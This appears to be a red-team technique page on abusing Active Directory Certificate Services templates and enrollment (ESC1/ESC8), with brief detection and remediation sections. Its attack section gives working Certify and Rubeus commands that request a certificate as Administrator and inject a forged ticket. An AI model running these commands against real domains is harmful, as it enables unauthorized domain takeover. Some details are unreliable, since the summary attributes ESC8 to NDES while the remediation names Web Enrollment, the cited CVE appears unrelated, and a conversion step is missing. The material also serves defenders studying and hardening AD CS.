# [PE-ELEVATE-001]: AD CS Certificate Services Abuse (ESC1/ESC8)

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | PE-ELEVATE-001 |
| **MITRE ATT&CK v18.1** | [Abuse Elevation Control Mechanism (T1548)](https://attack.mitre.org/techniques/T1548/) |
| **Tactic** | Privilege Escalation / Credential Access |
| **Platforms** | Windows AD / AD CS |
| **Severity** | **Critical** |
| **CVE** | **CVE-2021-27239** (Related) |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** Active Directory Certificate Services (AD CS) misconfigurations allow attackers to request certificates that can be used for authentication (Kerberos PKINIT). Two common flaws are:
    1.  **ESC1:** A Certificate Template allows "Client Authentication" and enables the flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`. This allows any user to request a certificate *for* any other user (e.g., Administrator) by specifying the Subject Alternative Name (SAN).
    2.  **ESC8:** The NDES (Network Device Enrollment Service) web interface allows NTLM authentication and does not enforce signing. Attackers can relay NTLM authentication from a Domain Controller (e.g., via PetitPotam) to the NDES server, obtain a certificate for the DC, and perform DCSync.
- **Attack Surface:** AD CS Templates / Web Enrollment.
- **Business Impact:** **Domain Compromise**.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** Any Authenticated User.
- **Tools:**
    - [Certify](https://github.com/GhostPack/Certify)
    - [Rubeus](https://github.com/GhostPack/Rubeus)

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage (ESC1)
**Step 1: Identify Vulnerable Template**
```cmd
Certify.exe find /vulnerable
```

**Step 2: Request Certificate**
Request a cert for "Administrator".
```cmd
Certify.exe request /ca:CA01.corp.local\CorpCA /template:VulnerableUser /altname:Administrator
```

**Step 3: Authenticate**
Convert the PEM to PFX and ask for a TGT.
```cmd
Rubeus.exe asktgt /user:Administrator /certificate:admin.pfx /password:123456 /ptt
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 AD Logs
| Source | Event | Filter Logic |
|---|---|---|
| **CertificationAuthority** | 4886 / 4887 | Certificate Request/Issue. Alert if `SubjectAltName` differs from the requester's identity. |
| **Security** | 4768 | TGT Request. `Certificate Information` field present. |

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Fix Templates:** Ensure `ENROLLEE_SUPPLIES_SUBJECT` is disabled on all templates that allow Client Authentication.
*   **Disable NTLM:** Disable NTLM on the IIS Certification Authority Web Enrollment endpoints (use Kerberos or HTTPS with EPA).

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-RECON-002]
> **Next Logical Step:** [CA-UNSC-001]
